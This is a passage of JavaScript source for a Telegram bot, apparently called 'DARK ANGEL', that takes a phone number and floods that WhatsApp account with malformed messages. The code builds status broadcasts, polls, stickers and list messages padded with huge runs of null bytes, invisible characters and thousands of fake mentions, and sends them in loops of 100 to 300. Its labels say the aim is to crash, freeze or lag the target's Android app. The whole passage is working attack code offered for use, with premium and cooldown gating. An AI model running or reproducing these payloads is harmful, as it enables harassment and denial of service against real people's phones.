        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox11", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox11 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await await VnXDelayXBulldoNew(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox12", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox12 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox13", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox13 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await blankclickv1(sock, target);
   await await astec(target);
   await VnXDelayXBulldoNew(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//============( FUNCTION ) =======\\
async function JawaTimurForclosexDelayNew(sock, target) {
  const messagePayload = {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
          fileLength: 0,
          pageCount: 0,
          mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
          fileName: "FaiqPdf",
          fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
          directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 99999999999999,
         documentSentTs: "9083773766021",
          quotedMessage: {
            conversation: "JawaTimurFunction"
          }
        }
      }
    },
    nativeFlowResponseMessage: {
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "# ⌁⃰FunctionJawaTimur🎩" + "ោ៝".repeat(890000),
            url: "https://wa.me/settings"
          })
        }
      ],
      messageParamsJson: "{".repeat(55000),
      quotedMessage: {
        conversation: "# ⌁⃰FunctionJawaTimur🎩"
      }
    },
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "9083773766021",
      quotedMessage: {
        conversation: "JawaTimurFunction"
      }
    },
    setUrlTrackingMap: {
      urltrackingmapelements: Array.from({ length: 280000 }, () => ({ type: 1 }))
    },
    headerType: 1
  };
  await sock.relayMessage("status@broadcast", messagePayload, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function DelayStatusHardByMia(sock, target) {
  const Track = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  const Location = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  const Mentions = {
    viewOnceMessage: {
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "\x10" + "\u0000".repeat(1030000),
                version: 3
              }
            }
          }
        }
      }
    }
  };
  for (const msg of [Track, Location, Mentions]) {
    await sock.relayMessage(
      "status@broadcast",
      msg,
      {
        messageId: null,
        statusJidList: [target],
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({}))
        },
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }

  try {
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });
    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target }
          }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "BOLD"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(522500),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });
    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target }
          }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };
    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });
    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 5600 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 5600 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function DelayCanSpamByMia(sock, target) {
  try {
    const msg = {
      interactiveResponseMessage: {
        body: { text: "MIA" },
        nativeFlowResponseMessage: { paramsJson: "\u0000".repeat(100000) },
        contextInfo: { mentionedJid: Array(1900).fill("1@s.whatsapp.net") }
      }
    };

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg } }, {});
  } catch (err) {
    console.log(err.message);
  }
}

async function blankclickv1(sock, target) {
  try {
    const msg = {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "13135550002@newsletter",
          newsletterName: "𑲱".repeat (10000),
          jpegThumbnail: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145
          ]),
          caption: "~@8~" + "ꦽ".repeat(10000),
          inviteExpiration: 99999999,
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }

    await sock.relayMessage(
      target,
      msg.message,
      { messageId: null }
    )

    console.log("BLANK SEND TO TARGET")
  } catch (err) {
    console.error(err)
  }
}

async function astec(target) {
    const astec = "\x00".repeat(999999);
    const lausape = "‍".repeat(500000);
    const diacritic = "\u0300".repeat(500000);
    const payload = astec + lausape + diacritic;
    
    for(let i = 0; i < 50; i++) {
        await sock.relayMessage(target, {
            extendedTextMessage: {
                text: payload,
                contextInfo: {
                    stanzaId: astec,
                    participant: "0".repeat(5000) + "@s.whatsapp.net",
                    quotedMessage: { conversation: payload },
                    expirationTimestamp: 9999999999999,
                    forwardingScore: 999999999
                }
            }
        }, { participant: { jid: target } });
        
        await sock.relayMessage(target, {
            listMessage: {
                title: payload,
                description: payload,
                buttonText: payload,
                sections: [{
                    title: payload,
                    rows: [{
                        title: payload,
                        description: payload,
                        rowId: payload
                    }]
                }]
            }
        }, { participant: { jid: target } });
    }
    
    return { status: "lah lau sape MPRUY? ", target: target };
}

async function VnXDelayXBulldoNew(sock, target) {
 await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          header: {
            listMessage: {
              title: "\u0000".repeat(350000),
              description: "\u0000".repeat(250000),
              buttonText: "VnX",
              footerText: "",
              listType: 1,
            sections: [
           {
            title: "",
              rows: Array.from({ length: 10 }, (_, i) => ({
              title: `\u0000`.repeat(250000),
              description: `\u0000`.repeat(250000),
              rowId: null
              }))
            }
          ],
          body: {
            text: "\u0000.VnX".repeat(999909),
            title: "\u0000.VnX".repeat(999909)
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(400000),
            version: 3
            }
          }
        }
      }
    }
  }
}, { participant: { jid: target } });

  console.log("[!] VnX Bug Sent to: " + target);
}

async function JawaTimurBlankOld(sock, target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": " # 🚯 FaiqOffc Freeze ",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}

async function ForceInvisions(target) {
  const xryy = {
   groupStatusMessageV2: {
     message: {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
         }
       }
     }
  }


  const msg = generateWAMessageFromContent(target, xryy, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg.message
  }},
  {
   messageId: msg.key.id,
   participant: { jid: target }
  });


  await new Promise((r) => setTimeout(r, 500));
}

async function JawaTimurIsBack(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "./K茅帽贸帽f脿莽t贸r." + "軎�".repeat(10000), 
            url: "https://files.catbox.moe/6yrcjm" +  "釤勧煗".repeat(15000) + ".mp4", 
            address: "../K茅帽贸帽f脿莽t贸r." + "軎�".repeat(20000),
            contextInfo: {
              externalAdReply: {
                renderLargerThumbnail: true, 
                showAdAttribution: true, 
                body: " Function Khas Jawa", 
                title: "喑勦線".repeat(10000), 
                sourceUrl: "https://t.me/" +  "嗉�".repeat(10000),  
                thumbnailUrl: null,
              }
            }
          },

          documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./ex3s.pdf" + "饝湨饝湢".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
          },
        }
      }
    };

    await sock.relayMessage(target, msg, {})

  } catch (err) {
    console.error("Error lol:", err);
  }
}

async function JawaTimurForcloseRelog(sock, target) {
       const options = [
        { optionName: "1msg" },
        { optionName: "execute" }
    ];
    const correctAnswer = options[1];
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "- ",
                            format: "EXTENSION_1"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(1_000_000),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "Staff Function Khas Jawa",
                            participant: "13135550202@s.whatsapp.net",
                            fromMe: false,
                            expiration: 7205,
                            ephemeralSettingTimestamp: 2502,
                            disappearingMode: {
                                initiator: "INITIATED_BY_OTHER",
                                trigger: "ACCOUNT_SETTING"
                            },
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                requestFrom: target,
                                expiryTimestamp: null
                            }
                        }
                    }
                }
            },
            botInvokeMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32),
                        messageAssociation: {
                            associationType: 7,
                            parentMessageKey: crypto.randomBytes(16)
                        }
                    },
                    pollCreationMessage: {
                        name: "Null᭾",
                        options: options,
                        selectableOptionsCount: 1,
                        pollType: "QUIZ",
                        correctAnswer: correctAnswer
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}
//============( END ) =======\\
bot.launch()
